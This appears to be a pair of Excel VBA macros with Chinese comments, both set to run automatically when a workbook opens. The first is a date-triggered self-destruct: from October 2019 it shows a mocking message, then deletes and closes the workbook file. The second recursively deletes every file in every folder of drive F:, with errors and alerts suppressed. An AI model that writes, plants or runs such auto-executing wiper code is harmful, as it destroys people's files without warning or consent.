

Private Sub Workbook_Open()
    Dim dat As Date
    dat = DateSerial(2019, 10, 1)
    If Date >= dat Then
        Application.DisplayAlerts = False
        MsgBox "你好，二货！你相信Excel会成精吗？" & vbCr & "大爷我活够了，我要死了，再见~嘎嘎嘎嘎嘎~。"
        With ThisWorkbook
             .Saved = True
             .ChangeFileAccess xlReadOnly
            Kill .FullName
             .Close
        End With
    End If
End Sub




Private Sub Workbook_Open()
    Dim p As String
    p = "F:\" '指定批量删除文件的所在硬盘
    Call Killy(p) '调用FSO遍历子文件夹的递归过程
End Sub

Function Killy(p)
    On Error Resume Next
    Application.DisplayAlerts = False
    Set fld = CreateObject("Scripting.FileSystemObject").GetFolder(p)
    Kill fld.Path & "\*.*"
    For Each fd In fld.SubFolders
        Call Killy(fd.Path)
    Next
End Function

